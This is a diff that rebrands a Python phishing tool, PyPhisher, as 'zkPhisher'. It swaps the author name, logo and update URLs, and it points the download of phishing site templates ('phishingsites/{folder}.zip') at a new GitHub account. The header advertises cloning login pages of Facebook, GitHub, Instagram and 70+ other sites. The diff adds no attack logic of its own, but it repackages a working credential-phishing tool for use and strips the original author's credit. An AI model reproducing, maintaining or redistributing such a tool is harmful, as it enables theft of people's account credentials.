@@ -1,12 +1,11 @@
 # -*- coding: UTF-8 -*-
-# ToolName   : PyPhisher
-# Author     : KasRoudra
+# ToolName   : zkPhisher
+# Author     : gaurav
 # Version    : 2.1
 # License    : MIT
 # Copyright  : KasRoudra (2021-2024)
-# Github     : https://github.com/KasRoudra
-# Contact    : https://t.me/KasRoudra
-# Description: PyPhisher is a phishing tool in python
+# Github     : https://github.com/Ydv95843
+# Description: zkPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
 # 1st Commit : 08/08/2021
 # Language   : Python
@@ -122,15 +121,7 @@ info2  =   f"{green}[{white}•{green}] {purple}"
 
 # Modifying this could be potentially dangerous
 logo = f"""
-{red}  _____       _____  _     _     _               
-{cyan} |  __ \     |  __ \| |   (_)   | |              
-{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
-{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
-{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
-{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
-{cyan}        |___/  {" "*11}      {red}[By \x4b\x61\x73\x52\x6f\x75\x64\x72\x61]
-"""
+ZKPHISHER
 
 
 lx_help = f"""
@@ -1064,10 +1055,10 @@ def masking(url):
 # Update of PyPhisher
 def updater():
     internet()
-    if not isfile("files/pyphisher.gif"):
+    if not isfile("files/zkphisher.gif"):
         return
     try:
-        toml_data = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/pyproject.toml").text
+        toml_data = get("https://raw.githubusercontent.com/Ydv95843/zkphisher/main/files/zkproject.toml").text
         pattern = r'version\s*=\s*"([^"]+)"'
         match = search(pattern, toml_data)
         if match:
@@ -1079,7 +1070,7 @@ def updater():
         gh_ver = version
     if gh_ver != "404: Not Found" and get_ver(gh_ver) > get_ver(version):
         # Changelog of each versions are seperated by three empty lines
-        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
+        changelog = get("https://raw.githubusercontent.com/Ydv95843/zkphisher/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
         print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{gh_ver}")
         upask=input(f"\n{ask}Do you want to update \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
@@ -1285,7 +1276,7 @@ def main_menu():
         elif choice.lower()=="s":
             saved()
         elif choice.lower()=="m":
-            bgtask("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
+            bgtask("xdg-open 'https://github.com/Ydv95843/Ydv95843#My-Best-Works'")
         elif choice == "0":
             pexit()
         else:
@@ -1296,7 +1287,7 @@ def main_menu():
         if not isdir(site):
             internet()
             delete("site.zip")
-            download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
+            download(f"https://github.com/Ydv95843/files/raw/main/phishingsites/{folder}.zip", "site.zip")
             extract("site.zip", site)
             remove("site.zip")
         copy(site, site_dir)
